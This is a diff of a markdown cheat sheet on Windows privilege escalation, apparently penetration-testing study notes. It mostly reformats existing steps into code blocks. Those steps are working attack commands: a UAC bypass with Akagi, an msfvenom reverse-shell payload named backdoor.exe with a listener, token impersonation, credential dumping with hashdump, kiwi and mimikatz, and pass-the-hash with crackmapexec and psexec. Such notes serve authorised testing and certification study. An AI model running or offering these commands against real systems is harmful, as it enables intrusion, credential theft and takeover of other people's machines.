@@ -15,46 +15,73 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 
 User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.
 
-* Prerequisites:
-  1. User must be a member of the Administrators group.
-  2. `net localgroup administrators`
-  3. Full interactive shell with the victim (a common nc.exe shell is not enough).
-     * You can use meterpreter
-* Metasploit
-  * search module bypassuac ...
-* UACME
-  1. If architecture is x64 it's better to use meterpreter x64 or migrate to process x64 with sessions=1
-     * `ps` to show process
-     * (ex. `migrate <PID explorer.exe>`)
-  2. Upload Akagi (Akagi64.exe if x64)
-  3. Create payload with msfvenom
-     * `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o backdoor.exe`
-  4. Use exploit/multi/handler to start a listener
-  5. `Akagi64.exe 23 <payload_full_path>`
-     * **NOTE FULL PATH**
-  6. Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs
+Prerequisites:
+
+1. User must be a member of the Administrators group. `net localgroup administrators`
+2. Full interactive shell with the victim (a common nc.exe shell is not enough).
+   * You can use meterpreter
+
+**Metasploit**
+
+```sh
+search bypassuac
+```
+
+**UACME**
+
+```sh
+# 1. Step
+ps
+migrate <PID explorer.exe>
+
+# 2. Step - Upload Akagi (Akagi64.exe if x64)
+
+# 3. Step - Create payload with msfvenom
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o backdoor.exe
+
+# 4. Step - Start a listener (exploit/multi/handler)
+
+# 5. Step - Run Akagi
+Akagi64.exe 23 <payload_full_path> # NOTE FULL PATH
+
+# Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs
+```
 
 ### Impersonate Tokens
 
-* With msfconsole: `load incognito`
-* `list_tokens -u`
-  * ```
-     Delegation Tokens Available
-     ========================================
-     ATTACKDEFENSE\Administrator
-     NT AUTHORITY\LOCAL SERVICE
-     
-     Impersonation Tokens Available
-     ========================================
-     No tokens available
-    ```
-* `impersonate_token <token_name>`
-  * `impersonate_token ATTACKDEFENSE\\Administrator` **NOTE: the two backslashes**
-* You may need to migrate process to a \<user> process
-  * Ex. `getpid`: 2628, `ps:`
-    * PID: 2948 | PPID: 2036 NAME: explorer.exe | ARCH: X64 | SESSION:1 | USER: ANTHING\Administrator | PATH: C:\Windows\explorer.exe
-* `getpid` : 2948
-* Of course you can repeat the process to become NT AUTHORITY\SYSTEM
+**Metasploit - incognito**
+
+```sh
+load incognito
+list_tokens -u
+```
+
+```
+ Delegation Tokens Available
+ ========================================
+ ATTACKDEFENSE\Administrator
+ NT AUTHORITY\LOCAL SERVICE
+ 
+ Impersonation Tokens Available
+ ========================================
+ No tokens available
+```
+
+```sh
+impersonate_token <token_name>
+# Ex: impersonate_token ANYTHING\\Administrator 
+# Note: the two backslashes
+```
+
+```sh
+# You may need to migrate process to a <user> process
+getpid
+ps     
+# PID: 2948 | PPID: 2036 NAME: explorer.exe | ARCH: X64 | SESSION:1 | USER: ANYTHING\Administrator | PATH: C:\Windows\explorer.exe
+
+# Migrate process
+migrate 2948
+```
 
 ### Password in configuration file (Unattend.xml)
 
@@ -72,32 +99,64 @@ Extract password and decode it (from base64)
 
 ### Credential Dumping (Mimikatz - Kiwi - Hashdump)
 
-* Prerequisites: User must be a member a local Administrators.
+Prerequisites: User must be a member a local Administrators.
 
 1. hashdump (Metasploit - Meterpreter)
-   * You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process (ex. `migrate <PID explorer.exe>`)
-   * `hashdump`
+
+```sh
+# You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process
+migrate <PID explorer.exe>
+hashdump
+```
+
 2. Kiwi (Metasploit - Meterpreter)
-   * You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process (ex. `migrate <PID explorer.exe>`)
-   * `load kiwi`
-   * `creds_all` Retrieve all credentials (parsed)
-   * `lsa_dump_sam` Here you can see that NTLM hashes for all of the user accounts on the system.
-   * To find the clear text passwords : `lsa_dump_secrets`
-     * However, from the Windows version 8.0+, windows don’t store any plain text password. So, it can be helpful for the older version of the Windows.
+
+```sh
+# You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process
+migrate <PID explorer.exe>
+
+load kiwi
+# Retrieve all credentials (parsed)
+creds_all 
+# NTLM hashes for all of the user accounts on the system
+lsa_dump_sam
+# Find the clear text passwords
+lsa_dump_secrets
+# Note: from the Windows version 8.0+, windows don’t store any plain text password.
+# So, it can be helpful for the older version of the Windows.
+```
+
 3. Mimikatz
-   * upload mimikatz.exe
-   * `\mimkatz.exe`
-   * `privilege::debug` - should return Privilege '20' OK - This should be a standard for running mimikatz as it needs local administrator access
-   * `lsadump::sam` : NTLM hashes for all of the user accounts on the system
-   * `sekurlsa::logonpasswords` : To find the clear text passwords, but it's not always possible
+
+```batch
+# 1. Upload mimikatz.exe
+
+# 2. Execute
+mimkatz.exe
+
+:: Get debug rights. This should be a standard for running mimikatz as it needs local administrator access
+:: This should return Privilege '20' OK.
+privilege::debug 
+
+:: NTLM hashes for all of the user accounts on the system
+lsadump::sam
+:: To find the clear text passwords, but it's not always possible
+sekurlsa::logonpasswords  
+```
 
 ### Pass the Hash
 
-1. `crackmapexec smb <ip> -u <administrator> -H <NTLM hash> -x "ipconfig"`
-2. Metasploit : windows/smb/psexec and set SMBPass with `<LM hash>:<NTLM hash>`
-   * empty LM hash : `AAD3B435B51404EEAAD3B435B51404EE` (means its non-use).
-     * `AAD3B435B51404EEAAD3B435B51404EE:<NTLM>`
-   * With `hashdump` you have the right format
+```sh
+# 1. Method
+crackmapexec smb <ip> -u <administrator> -H <NTLM hash> -x "ipconfig"
+
+# 2. Method (Metasploit) -> windows/smb/psexec
+set SMBPass <LM hash>:<NTLM hash>
+```
+
+* Empty LM hash: `AAD3B435B51404EEAAD3B435B51404EE` (means its non-use).
+  * `AAD3B435B51404EEAAD3B435B51404EE:<NTLM>`
+* With `hashdump` you have the right format
 
 ### Other
 
@@ -211,7 +270,6 @@ gcc binary.c -o <loaded_binary>
 
 ## Resource
 
-* **juggernaut-sec.com/blog/** Windows/Linux privesc and active directory hacking
 * **gtfobins.github.io** _GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems_
 * **github.com/carlospolop/PEASS-ng/tree/master/linPEAS** _Linux Privilege Escalation Awesome Script_
 * **github.com/DominicBreuker/pspy** _Monitor linux processes without root permissions_
